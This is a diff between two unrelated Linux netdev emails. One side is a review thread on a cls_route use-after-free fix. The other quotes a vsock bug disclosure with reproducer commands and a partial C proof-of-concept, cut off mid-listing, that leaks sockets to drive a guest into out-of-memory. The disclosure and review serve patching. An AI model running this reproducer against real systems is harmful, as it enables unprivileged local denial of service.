@@ -1,260 +1,634 @@
-Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
+Received: from mail-lf1-f47.google.com (mail-lf1-f47.google.com [209.85.167.47])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C05C33C4B87
-	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 13:12:58 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.179
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C7979439F97
+	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 13:14:15 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.167.47
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785244380; cv=pass; b=KYT9sOENhYFPiFAkvp6J8+P7oQDt0U2h+PmHpWu7NpEKkq9x/wa5KoWyQP6bqpNdqV1mpgQNN7QNwtrlMzvnsqYlC3hSlmj2pB8yszDBwVL74k0QPA3pnXJ/o/pJYd1W+H+FKd1munaiUh0+jUOwOuCNIkhH0Ut5RcE3VuNeBqE=
+	t=1785244459; cv=pass; b=s6Tz0e75ModTAzN9SO25CDFPNgj0eWqwNCJTT5rgEN/6ChYHef29qzXKgjsqjXt+UVeR3AAl5LynIpmhizAtG+RLuMQhru8GYvgUGPaQwYn8/OnXoBLihSiTjk9z8Ix/WxW2vQt/zApYqJirzroRKP1t/yujXuZ/8VTV38XWFk8=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785244380; c=relaxed/simple;
-	bh=5PitEWE4LVtxfe2H74Csmay5+z32OyTcksU82m9HLNs=;
+	s=arc-20240116; t=1785244459; c=relaxed/simple;
+	bh=YZZk8CsasDs2NhVPubSNPSGhK33Q2Ovy7C1xyfiLHJU=;
 	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=YXm5LDG04oykWiwBPK6FaLSD6jSptRglzpHxdTZgGRx/Aoi+sMCWUyt6sg4lTcBPaLPxUSBs3I27qaZIPDEAoj7k9jIrBTkDQq3+3eltxj4nOCo2O2gSLnvFDNRu/Gt8jPuZoldPeDbOMlKtsy8nHE/ps8tyWIw9KsSwxiSSjcc=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b=vm8X+TPL; arc=pass smtp.client-ip=209.85.210.179
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
-Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
+	 To:Cc:Content-Type; b=DL52ohq26kVb2EUHmsVA8bPAEokfP/YJGaRzWWiydNmjzt0vXD+zDxlHrvNMKU2csmgyXre7djiTaXJsVgrNXrcxoh8/tWmMQcFSH0yDy9b2pbr1CZDxecSV0X/YIaJyln0q/YMfjwE273TCPLOJExBeHDtlyU2Q9i2QU+5WWXA=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=WOJ+vK/D; arc=pass smtp.client-ip=209.85.167.47
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b="vm8X+TPL"
-Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-848593533cbso2823692b3a.3
-        for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 06:12:58 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1785244378; cv=none;
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="WOJ+vK/D"
+Received: by mail-lf1-f47.google.com with SMTP id 2adb3069b0e04-5b011edaf7dso3882302e87.2
+        for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 06:14:15 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1785244453; cv=none;
         d=google.com; s=arc-20260327;
-        b=KTMiZUPF8YP7OOqMJa6XAQ552y4MB4LWBt1+wmJOp5nH/zLMe0C1GPdQTKCSa67XR0
-         /c0uLg2cdW6h7BJai1snLshRSfOSFYnWoy6FZPxJPuTUpj2cHZ/MTp+zOrD6xHlGGWGj
-         OKD9/dWtGZY3bzwFKn/YZH1tjxuYJclnL/Xeo3MAD5sWWdajM4iI2eQ2Gs+Q+1upwujw
-         ROeWH5ELEQ4GSC4So071rbbW6qZZx6KvE2vr/ZLLnP5DjQWnFZTDCqh8uJk7EklFX3bx
-         TCo/a5cJQ0jg1UUQyk9eBjoVYJoSnkzmWcW7oUhEe3Xs6zcTZU0/9odXDsB0ojgBOcR/
-         5fXQ==
+        b=qN7qpz8wIsT/ggdle1ZGG5eRNLkMhwxKrkIFn12rDgK8mlWNNImoyY8es+LDCaxaf0
+         vT9UAV0SxC1g+SQiixRlJ3kDFsozkGHqfMfXgECo9oKHqhMTnQr/os2TFkO2nWvX+OGi
+         DvyM6WtAlsBLNzx+uUNdpdl36PJdGsqd4P/TOet7Tvvxe1gu/kkS8T2yCO4L3YAmsjxp
+         ewHQr1Mov9bKg0sWnhUegElio9cW+lRRQi9WRb+0D5FmDl15Rg6maViys1Vf6XW9hxmL
+         x9JBkjrBbaJrBa5KbWlPhKSZg3VtDYHcULMG+wZ/9l45xuOg166JYZ/HxSxuvGVdJBa4
+         FQyA==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=cc:to:subject:message-id:date:from:in-reply-to:references
-         :mime-version:dkim-signature;
-        bh=RsLXOGn4ljM01hXnayTxvwBZ9s73EJ6kvuoyVSlCNSo=;
-        fh=f7cUH0j2XkhKmpjCLO6wd3b0SZWBfkjaPRXI7cwW36U=;
-        b=ILe1bTT0kzUgZ2O03adkYn4wxs4tbx/tCYd1I7WWkDVMprIUTn2WKDlrycczrldrPD
-         89MEf0+/B+6sowhjjVU3T17aqpicUUutG1Ax1R4XR88K9MgoZIZT7O9oRymaLptmW3da
-         Iy+7u7zy4Z1bAUb2mI0dm6M2FyTxq6CjtbuLWRXTXUQORb15vhlesXTHaW42i7T+VL25
-         qw5DLnK9b/y8jpRJ69WZ97SB9qWi0m1ojKRFSiczr5asDve543LRE7KE/zuFoIOn3k6p
-         /GxU7fhAKREGZLLi+lsFnXUz1le5hY3J1uQ8lK1Ynv1cCWuBLzAf5LzithXmexSX1qoL
-         VcVA==;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
+        fh=uSI8bXhPWEL91t0ngvLjJBXd3qm54fWdo8hWukIkT68=;
+        b=HahD4skJMICNCEAuHTB7Hw6cMpdKK9pI3ZjxcPFsoMMMwzMPxwqpWx6fvFUVSXJIr1
+         x9wEfno5EPlR1IF5Sx1DvFY8ZOqrO6kwTwsW7mGUWFg9nI2Iewr+Lu+vjLP3Rjnhyym1
+         ukIw/4Dz6Mvq3RykstPIitOl44OViQD3zcMAu+ViZI2wMyidIilotuGRDeJRuQSo0qFT
+         A+rKYKUeYoBc5dWO3Pi4zsE4eJmSilvTxur1NApq5ioaM2ORdoQV3dSqQMBX+xb+og8h
+         p19AR7ZuOs5757Dn8rqSh3IFLVcaLzCcNBTO7o/2hjP0EozW/g8DKWt6qd8HAbn/hozh
+         Eo3g==;
         darn=vger.kernel.org
 ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=mojatatu.com; s=google; t=1785244378; x=1785849178; darn=vger.kernel.org;
-        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
-         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=RsLXOGn4ljM01hXnayTxvwBZ9s73EJ6kvuoyVSlCNSo=;
-        b=vm8X+TPLZX/3TMm28ETsCWOl5VAAoKsjNxJ9TIXREX9djlK6gGGmiPebH4NWCjI67E
-         WfRzVTe6JOswBNUbRinkHhIgltaSlDrIJohacJHIJeCU9BykVu37FJ01fKaiKiv7pZpv
-         r0ePSGWhQT8rOxC2qgiLjcgqRBsrudY1bHjPU=
+        d=nebusec.ai; s=google; t=1785244453; x=1785849253; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
+        b=WOJ+vK/DDI41cAf6AUMUzGuO6GPhb3bvV4zAxGu1RQ2Egvwp99In0348Ert5qvhZMe
+         C24JnKLVf0/io8Sbbjq11K4E8jICNDKtrQurxqOjfz6vLwuTSTZkU/EyTMYk6+YtEYNZ
+         2w1xbvRx+MD0Fpdey78FslAlSZX8afoP7cctZMA5E569WO9We5CWgqyo39uFxHt/nxNw
+         eYqQE+Wi5zzOQmEOhoEtqUv566zW0ImUOtY0kX079RwRZKbkv6JQcm8cm60AGr8z3HDh
+         jiwD9UGL/JKJC8yMqiA3OqXKfxw1jxewK2azIy/wHk+hpW1KrlWJPllsJjUS1ZWZhikW
+         pjUQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785244378; x=1785849178;
-        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
-         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to:content-type;
-        bh=RsLXOGn4ljM01hXnayTxvwBZ9s73EJ6kvuoyVSlCNSo=;
-        b=sjivMOEcA97ODfBKLj4FflQFT56+Cjk0eAKylLSzP/T7ICJEzpBM4Vh8jH4d3GkRc2
-         CH20A/suL6Z0k96iki67rxfbtcUusvexAD1C1+X+3cFCJzkkcsg5OclZ6201rJYjGASX
-         eQzxh8eStXiTBuJbch3bNtuOiG+hn++glP5Z4FPdDw24dD4LK1cORMLqZ0z7+6U1qMnD
-         pgk50ZKEMwBsfb93QxJ67sIC27063Me6VE++6xNKGz26lHwcwG3JqjYoRIx4Mg3VtYMo
-         Lm0z/v4ohk3MzbOe8Yxsr7BVuTkLgAcsW5ynPBX+ZjA9RqQdzMgKPYmbW3GxR2OxUkcc
-         tDCQ==
-X-Gm-Message-State: AOJu0YygLs41zjvnafZ8Yprh5V2iQVeAcyDrA/M9xudvn3dzxXZ8l1tV
-	AvvFpTd2qpgVVSaxfRzJZCUP/obzqn3LdCV3bK+XGrFp3t4IPP1NFKFMJ+59C0BzKBJK6xLbpYN
-	/yQdcy9KYMB68LtzLKgDuOy7gHpz20L0wt9JB73SM
-X-Gm-Gg: AR+sD12jZbYY6pP41H3d9knApHkp+H8f6CUL2XCQBE0ISba+OOk0scv5YBhYoWY7lkX
-	pi1PX4iyapsbpjALYA1EDBWD0nlGwfpCm4imsGtQcknqsTQsFr+ATT7t5l7zr+25HgvRZRuNX7Q
-	M33GY0zqkTEKhkCYRMKj3x7o44d4HxjLQZncziJ67T7jy9Eq5k89clKEkwFMl+tLE5AvNVWMTAG
-	/liA2m4l3cSuyHhfPzFegVdHPJ85rWc7/wPdT4yMIvuU4L7gnep8YPj5Pjy+DKvzJmK1bwCMDeM
-	LRqOisq0TnbU292UJZLxPYbcWcrROx22ADetYG+ZuR3Ogg==
-X-Received: by 2002:a05:6a00:21cd:b0:848:2f71:b657 with SMTP id
- d2e1a72fcca58-84e9337dd1dmr2417946b3a.66.1785244377878; Tue, 28 Jul 2026
- 06:12:57 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1785244453; x=1785849253;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
+        b=FfjW50ih2ZzFGBV9dDxk7ncFzsxr2h7alZBJ8344ngfRAFIIdkbVIOM3WO4no/j/mS
+         4LXSMpfYT9QPwU631dA19svLCveCOf/4PoM7uxa1Ma5K5AVM50FJJYC/l6WtEzibbxhn
+         dWm+i5bBv2h8wtfeRTTgnHxOOpJf2JCflbPDFti2bUQra8Uy6CvwVwmjwidEqWUHVwT7
+         UascPOJU4ZGU1P7TaIBcFVDtAnCyPzDdsK5ljcyHwGpTBCR+pXM3tMkrU0Si8WQt45Xm
+         7qys8RS4HQzjOZ5wTwxVDmclKfuOFBjNHG7+1X+L7kvKDDNRnq9smxukyeAlM+saVRug
+         AQQw==
+X-Forwarded-Encrypted: i=1; AHgh+RpOrRo0C0Ai+O6EYIdYNQ3MtSvVNd2ivhJRHXY07og4DyEUd87G5OvtpS9TH6Gm+K9G/2d2Z1s=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yypp4MY/czwyA+0OmsjJfe79rkRRvS/LBveLr9095JpapTsgPM8
+	KpIhgGcBk1UKyZwq8pk/FQH8dJpvAFx5ygOVTpvrvrPkFj5CfZoEqxSy8mJcoqSNAhdUgSqj/O2
+	IqAQyLFgBUxhIADWg8+fKePgMlOi8F4ml8Zrph4saj9E=
+X-Gm-Gg: AR+sD11cDvTk4D6dNeun6XmH1XmgCYNGouzT5acTIJr8nmnXSxQMA70Z4xtDSOT1DfE
+	AHKspKoj8IFIpJIDyCZ6lOCm8RQKCThdAMPrIJxe5iWywN/hYofq6g9rwR2PA8ztRE8V+vXO0PK
+	/hIHOjUU6s+weCqMIJZfkdiWoYPmkSmRc3bTmOmUlKXsTZEzDvDq4Q/BBohf3MWHTac9s9KlzP7
+	Wg8X5p2qDpAsyg1PKyHHdvOiEvvteyCo09AmbUQpwFyYL7RyJEN+/DvKxbq
+X-Received: by 2002:a05:6512:308d:b0:5b1:5a31:86b2 with SMTP id
+ 2adb3069b0e04-5b2d0236bf3mr538868e87.16.1785244452986; Tue, 28 Jul 2026
+ 06:14:12 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260723105210.817079-1-jhs@mojatatu.com> <3914dd5c-77c8-4f96-8bfc-986f0a00f722@redhat.com>
- <CAM0EoMn6sLJ_OMXY8-B4RE3r9XunFB=OkHbYJ-c-VBpADyO29Q@mail.gmail.com> <da0313c5-1060-49fb-a1a3-72197eda4d8e@redhat.com>
-In-Reply-To: <da0313c5-1060-49fb-a1a3-72197eda4d8e@redhat.com>
-From: Jamal Hadi Salim <jhs@mojatatu.com>
-Date: Tue, 28 Jul 2026 09:12:46 -0400
-X-Gm-Features: AUfX_mw1XP2-NPHioV06gzDgV5xM2e-PWrTVRmgQN5cosWlyvmNYVqUKt_wf0gg
-Message-ID: <CAM0EoMkRMOBmrGW3fAcxxhTxcLaP44zr4m5Ds8G2VFT1CissNA@mail.gmail.com>
-Subject: Re: [PATCH net 1/1] net/sched: cls_route: fix fastmap use-after-free
- on filter
-To: Paolo Abeni <pabeni@redhat.com>
-Cc: netdev@vger.kernel.org, kuba@kernel.org, davem@davemloft.net, 
-	edumazet@google.com, horms@kernel.org, john.fastabend@gmail.com, 
-	jiri@resnulli.us, zdi-disclosures@trendmicro.com, sh.kalluri129@gmail.com, 
-	victor@mojatatu.com, security@kernel.org, stable@vger.kernel.org, 
-	Santosh Kalluri <santosh.kalluri129@gmail.com>
-Content-Type: multipart/mixed; boundary="000000000000fb3b0b0657ab9857"
-
---000000000000fb3b0b0657ab9857
+References: <cover.1784649300.git.zihanx@nebusec.ai> <amhpGj8ikeyfYazT@sgarzare-redhat>
+In-Reply-To: <amhpGj8ikeyfYazT@sgarzare-redhat>
+From: zihan xi <zihanx@nebusec.ai>
+Date: Tue, 28 Jul 2026 21:13:58 +0800
+X-Gm-Features: AUfX_mw5h8yIiNZ-uyO2pZi9LH0nkV43yLu3FYGFDK8eCC4-eQ1YCyDYwir1mfs
+Message-ID: <CAANe3eTm6Bc5-sD7cupL6gOs6Rk3jNk_2CPgqjtusyj4O5BsLg@mail.gmail.com>
+Subject: Re: [PATCH net 0/1] vsock: clear stale sk_err before listen()
+To: Stefano Garzarella <sgarzare@redhat.com>
+Cc: Ren Wei <enjou1224z@gmail.com>, virtualization@lists.linux.dev, 
+	netdev@vger.kernel.org, davem@davemloft.net, edumazet@google.com, 
+	pabeni@redhat.com, horms@kernel.org, dtor@vmware.com, georgezhang@vmware.com, 
+	acking@vmware.com, vega@nebusec.ai
 Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-On Tue, Jul 28, 2026 at 9:05=E2=80=AFAM Paolo Abeni <pabeni@redhat.com> wro=
-te:
+On Tue, Jul 28, 2026 at 4:38=E2=80=AFPM Stefano Garzarella <sgarzare@redhat=
+.com> wrote:
 >
-> On 7/28/26 2:37 PM, Jamal Hadi Salim wrote:
-> > On Tue, Jul 28, 2026 at 6:34=E2=80=AFAM Paolo Abeni <pabeni@redhat.com>=
- wrote:
-> >>
-> >> On 7/23/26 12:52 PM, Jamal Hadi Salim wrote:
-> >>> diff --git a/net/sched/cls_route.c b/net/sched/cls_route.c
-> >>> index bd6f945bd388..700f878fc3cd 100644
-> >>> --- a/net/sched/cls_route.c
-> >>> +++ b/net/sched/cls_route.c
-> >>> @@ -297,16 +297,29 @@ static void route4_destroy(struct tcf_proto *tp=
-, bool rtnl_held,
-> >>>                                       next =3D rtnl_dereference(f->ne=
-xt);
-> >>>                                       RCU_INIT_POINTER(b->ht[h2], nex=
+> On Fri, Jul 24, 2026 at 01:21:13AM +0800, Ren Wei wrote:
+> >From: Zihan Xi <zihanx@nebusec.ai>
+> >
+> >Hi Linux kernel maintainers,
+> >
+> >We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
+> >reachable by an unprivileged local user via AF_VSOCK loopback. We've
+> >tested it, and it should not affect any other functionality.
+>
+> Please check the following patches under discusion that seem related to
+> the issue you are reporting:
+> - https://lore.kernel.org/virtualization/20260719220103.684489-1-phind.ue=
+t@gmail.com/
+> - https://lore.kernel.org/virtualization/20260727071305.45826-1-phind.uet=
+@gmail.com/
+>
+> If you test it, please send a Tested-by
+>
+> Thanks,
+> Stefano
+>
+> >
+> >This series contains one patch:
+> >  1/1 vsock: clear stale sk_err before listen()
+> >
+> >We provide bug details, reproducer steps, and a crash log below.
+> >
+> >---- details below ----
+> >
+> >Bug details:
+> >
+> >A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
+> >socket. If userspace then calls listen() on the same socket, the stale
+> >error remains attached to the listener. A later child can still reach th=
+e
+> >accept queue, but vsock_accept() sees listener->sk_err, rejects the
+> >child, and drops only the transient accept reference.
+> >
+> >On the virtio loopback path that rejected child can remain orphaned in t=
+he
+> >vsock tables, so repeated iterations leak children and can eventually
+> >push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
+> >failed connect() attempt from poisoning the next listener incarnation of
+> >that socket.
+> >
+> >On our fixed-kernel validation, the same minimal reproducer no longer hi=
+t
+> >that failed accept path and accept() returned a valid child socket.
+> >
+> >Reproducer:
+> >
+> >    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
+> >    echo 2 > /proc/sys/vm/panic_on_oom
+> >    echo 1 > /proc/sys/vm/oom_dump_tasks
+> >    /root/poc 100 44000 54000 33554432 33554432 600
+> >
+> >We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> >
+> >------BEGIN poc.c------
+> >
+> >#define _GNU_SOURCE
+> >
+> >#include <arpa/inet.h>
+> >#include <errno.h>
+> >#include <linux/vm_sockets.h>
+> >#include <pthread.h>
+> >#include <signal.h>
+> >#include <stdbool.h>
+> >#include <stdint.h>
+> >#include <stdio.h>
+> >#include <stdlib.h>
+> >#include <string.h>
+> >#include <sys/socket.h>
+> >#include <sys/time.h>
+> >#include <sys/types.h>
+> >#include <time.h>
+> >#include <unistd.h>
+> >
+> >#define DEFAULT_BASE_PORT 40000U
+> >#define DEFAULT_FAIL_PORT 50000U
+> >#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
+> >#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
+> >#define DEFAULT_ITERATIONS 1U
+> >
+> >struct client_ctx {
+> >       pthread_mutex_t lock;
+> >       pthread_cond_t cond;
+> >       unsigned int server_port;
+> >       unsigned int client_port;
+> >       unsigned long long send_bytes;
+> >       unsigned long long bytes_sent;
+> >       int connect_errno;
+> >       int send_errno;
+> >       int sent_any;
+> >       int connected;
+> >       int done;
+> >       int fd;
+> >};
+> >
+> >static void die(const char *msg)
+> >{
+> >       perror(msg);
+> >       exit(EXIT_FAILURE);
+> >}
+> >
+> >static void set_vsock_u64(int fd, int optname, unsigned long long val)
+> >{
+> >       if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
+> >               die("setsockopt(AF_VSOCK)");
+> >}
+> >
+> >static void set_connect_timeout(int fd, long sec)
+> >{
+> >       struct timeval tv =3D {
+> >               .tv_sec =3D sec,
+> >               .tv_usec =3D 0,
+> >       };
+> >
+> >       if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
+> >                      &tv, sizeof(tv)) < 0) {
+> >               die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
+> >       }
+> >}
+> >
+> >static void bind_vsock(int fd, unsigned int cid, unsigned int port)
+> >{
+> >       struct sockaddr_vm svm =3D {
+> >               .svm_family =3D AF_VSOCK,
+> >               .svm_cid =3D cid,
+> >               .svm_port =3D port,
+> >       };
+> >
+> >       if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
+> >               die("bind(AF_VSOCK)");
+> >}
+> >
+> >static int connect_vsock_errno(int fd, unsigned int cid, unsigned int po=
+rt)
+> >{
+> >       struct sockaddr_vm svm =3D {
+> >               .svm_family =3D AF_VSOCK,
+> >               .svm_cid =3D cid,
+> >               .svm_port =3D port,
+> >       };
+> >
+> >       if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) =3D=3D 0)
+> >               return 0;
+> >
+> >       return errno;
+> >}
+> >
+> >static void *client_thread(void *arg)
+> >{
+> >       struct client_ctx *ctx =3D arg;
+> >       char *buf;
+> >       unsigned long long sent =3D 0;
+> >       const size_t chunk =3D 64 * 1024;
+> >       int fd;
+> >       int err;
+> >
+> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
+> >       if (fd < 0)
+> >               die("client socket(AF_VSOCK)");
+> >
+> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes)=
+;
+> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
+> >       bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
+> >
+> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_por=
 t);
-> >>>                                       tcf_unbind_filter(tp, &f->res);
-> >>> -                                     if (tcf_exts_get_net(&f->exts))
-> >>> -                                             route4_queue_work(f);
-> >>> -                                     else
-> >>> -                                             __route4_delete_filter(=
-f);
-> >>> +                                     /* Always defer the free.  The =
-direct
-> >>> +                                      * __route4_delete_filter() pat=
-h has no
-> >>> +                                      * grace period and races with =
-readers
-> >>> +                                      * that cached f in the fastmap=
-.
-> >>> +                                      */
-> >>> +                                     tcf_exts_get_net(&f->exts);
-> >>> +                                     route4_queue_work(f);
-> >>
-> >> Sashiko fears the above would be race prone:
-> >>
-> >> https://netdev-ai.bots.linux.dev/sashiko/#/patchset/20260723105210.817=
-079-1-jhs%40mojatatu.com
-> >>
 > >
-> > That was fixed in v2. Is there something i can do next time (message
-> > patchwork?) to not waste your time looking at an older version?
->
-> Usually the tool properly updates the old revision status, but sometimes
-> it fails do to that.
->
-> Double checking that the old revision is marked as superseded in PW
-> after posting the new one could help.
->
-> >>>                               }
-> >>>                       }
-> >>>                       RCU_INIT_POINTER(head->table[h1], NULL);
-> >>>                       kfree_rcu(b, rcu);
-> >>>               }
-> >>>       }
-> >>> +
-> >>> +     /* All filters are unlinked; no new reader can find them on the
-> >>> +      * chain.  Wait for in-flight readers that may still hold a fil=
-ter
-> >>> +      * pointer and have published it into the fastmap after we unli=
-nked.
-> >>> +      * Then flush the stale entries while head is still valid under
-> >>> +      * RTNL, matching the route4_delete() pattern.
-> >>> +      */
-> >>> +     synchronize_rcu();
-> >>> +     route4_reset_fastmap(head);
-> >>
-> >> This really looks like quite a big hammer.
+> >       pthread_mutex_lock(&ctx->lock);
+> >       ctx->fd =3D fd;
+> >       ctx->connect_errno =3D err;
+> >       ctx->connected =3D (err =3D=3D 0);
+> >       pthread_cond_broadcast(&ctx->cond);
+> >       pthread_mutex_unlock(&ctx->lock);
 > >
-> > It is.
-> > I viewed  it as bug fix to original intent of 1109c00547fc - that
-> > commit even though had the intent of protecting the fast map as as
-> > well (based on the wording of comment i saw).
-> > If performance is a big concern: another approach that maybe worth
-> > considering is to totally remove the fastpath. It maybe more
-> > performant than imposing the rcus.
->
-> Given the amount of effort involved in rtnl lock contention reduction, I
-> think it would be great if we could avoid the synchronize_rcu(), if it
-> does not block the fix for an unreasonable amount of time.
->
-> >> Since there is already a
-> >> synchronization point for both reader and write while acquiring the
-> >> fastmap_lock, I'm wondering if something alike the following could wor=
-k ?!?
-> >> (completely untested!!!):
-> >>
+> >       if (err)
+> >               return NULL;
 > >
-> > Your approach has some holes, example misses the most dangerous part -
-> > destroy(), etc
-> > I will mull over it and see if it can be fixed to handle all the
-> > issues. I think it's possible i just need to put time to
-> > validate/test.
-> I would appreciate that, thanks!
-
-See attached. Untested (compiles) -  addresses my destroy() concern
-eaerlier _i think_ (unless something pops up in testing)
-
-
-cheers,
-jamal
-> Paolo
+> >       buf =3D malloc(chunk);
+> >       if (!buf)
+> >               die("malloc");
+> >       memset(buf, 'A', chunk);
+> >
+> >       while (sent < ctx->send_bytes) {
+> >               size_t todo =3D chunk;
+> >               ssize_t rc;
+> >
+> >               if (ctx->send_bytes - sent < todo)
+> >                       todo =3D ctx->send_bytes - sent;
+> >
+> >               rc =3D send(fd, buf, todo, 0);
+> >               if (rc < 0) {
+> >                       pthread_mutex_lock(&ctx->lock);
+> >                       ctx->send_errno =3D errno;
+> >                       pthread_mutex_unlock(&ctx->lock);
+> >                       break;
+> >               }
+> >
+> >               if (rc =3D=3D 0)
+> >                       break;
+> >
+> >               sent +=3D rc;
+> >               pthread_mutex_lock(&ctx->lock);
+> >               ctx->sent_any =3D 1;
+> >               ctx->bytes_sent =3D sent;
+> >               pthread_cond_broadcast(&ctx->cond);
+> >               pthread_mutex_unlock(&ctx->lock);
+> >       }
+> >
+> >       free(buf);
+> >
+> >       pthread_mutex_lock(&ctx->lock);
+> >       ctx->done =3D 1;
+> >       pthread_cond_broadcast(&ctx->cond);
+> >       pthread_mutex_unlock(&ctx->lock);
+> >
+> >       return NULL;
+> >}
+> >
+> >static void client_ctx_init(struct client_ctx *ctx, unsigned int server_=
+port,
+> >                           unsigned int client_port,
+> >                           unsigned long long send_bytes)
+> >{
+> >       memset(ctx, 0, sizeof(*ctx));
+> >       pthread_mutex_init(&ctx->lock, NULL);
+> >       pthread_cond_init(&ctx->cond, NULL);
+> >       ctx->server_port =3D server_port;
+> >       ctx->client_port =3D client_port;
+> >       ctx->send_bytes =3D send_bytes;
+> >       ctx->fd =3D -1;
+> >}
+> >
+> >static void client_ctx_destroy(struct client_ctx *ctx)
+> >{
+> >       pthread_mutex_destroy(&ctx->lock);
+> >       pthread_cond_destroy(&ctx->cond);
+> >}
+> >
+> >static int wait_for_connect(struct client_ctx *ctx)
+> >{
+> >       int err;
+> >
+> >       pthread_mutex_lock(&ctx->lock);
+> >       while (!ctx->connected && ctx->connect_errno =3D=3D 0)
+> >               pthread_cond_wait(&ctx->cond, &ctx->lock);
+> >       err =3D ctx->connect_errno;
+> >       pthread_mutex_unlock(&ctx->lock);
+> >
+> >       return err;
+> >}
+> >
+> >static void wait_for_send_progress(struct client_ctx *ctx)
+> >{
+> >       struct timespec ts;
+> >
+> >       clock_gettime(CLOCK_REALTIME, &ts);
+> >       ts.tv_sec +=3D 2;
+> >       if (ts.tv_nsec >=3D 1000000000L) {
+> >               ts.tv_sec +=3D 1;
+> >               ts.tv_nsec -=3D 1000000000L;
+> >       }
+> >
+> >       pthread_mutex_lock(&ctx->lock);
+> >       if (!ctx->done)
+> >               pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
+> >       pthread_mutex_unlock(&ctx->lock);
+> >}
+> >
+> >static int prepare_listener(unsigned int server_port, unsigned int fail_=
+port,
+> >                           unsigned long long buffer_size)
+> >{
+> >       int fd;
+> >       int err;
+> >
+> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
